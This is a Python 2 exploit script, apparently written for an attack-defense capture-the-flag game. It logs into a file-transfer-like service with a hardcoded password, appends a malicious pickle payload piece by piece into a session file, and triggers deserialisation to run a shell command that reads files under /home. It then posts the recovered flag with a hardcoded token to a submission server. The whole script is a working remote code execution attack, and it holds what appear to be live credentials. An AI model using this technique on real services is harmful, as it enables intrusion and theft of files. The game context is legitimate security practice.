import socket
import struct
import time
import telnetlib
import re
import sys

def submit(flag):
    import requests
    import json
    token = "WRr7S6DHrH7tuF4F"
    url = 'http://10.10.10.10/submit'
    headers = {'content-type': 'application/json'}
    print flag
    postData = { 'flag': flag, 'token': token }
    r = requests.post(url, data = json.dumps(postData), headers=headers)
    print r.text

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = sys.argv[1]
port = 3447

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

readuntil(f, 'Username: \n')
f.write('Amami Daizen\n')

readuntil(f, 'Password: \n')
f.write('nGv6X9wNIfvVAkmD8WFk\n')

readuntil(f, 'do the magic.\n')
f.write('SESSION\n')

res = readuntil(f, 'do the magic.\n')
pattern = re.compile("tamp\":\"(.*?)\.")

session = pattern.findall(res)[0].replace('T','_').replace(':','-')

f.write('CATFTP\n')
readuntil(f,'filename please.\n')

f.write('session/' + session + '\n')
readuntil(f, 'awesome CatFTP?\n')

f.write('STOR\n')
readuntil(f, 'be sad at himself ><\n')

f.write('cos\n')
readuntil(f, 'OK\n')

f.write('CATFTP\n')
readuntil(f, 'do the magic.\n')

f.write('session/' + session + '\n')
readuntil(f, 'filename please.\n')

f.write('APPE\n')
readuntil(f, 'be sad at himself ><\n')

f.write('system\n')
readuntil(f, 'OK\n')

f.write('CATFTP\n')
readuntil(f, 'do the magic.\n')

f.write('session/' + session + '\n')
readuntil(f, 'please.\n')

f.write('APPE\n')
readuntil(f, 'himself ><\n')

f.write("(S'cat /home/*/c*/*'" + "\n")
#f.write("(S''" + "\n")
readuntil(f, 'OK\n')

f.write('CATFTP\n')
readuntil(f, 'and do the magic.\n')

f.write('session/' + session + '\n')
readuntil(f, 'filename please.\n')

f.write('APPE\n')
readuntil(f, 'be sad at himself ><\n')

f.write('tR.\n')
readuntil(f, 'OK\n')

#f.write('tR.\n')
#readuntil(f, 'OK\n')

f.write('SESSION\n')

readuntil(f, 'do the magic.\n')
flag = f.read(32)
submit(flag)
#print f.read(4096)

#t = telnetlib.Telnet()
#t.sock = s
#t.interact()



#print readuntil(f, 'do the magic.\n')

#print readuntil(f, '\n')

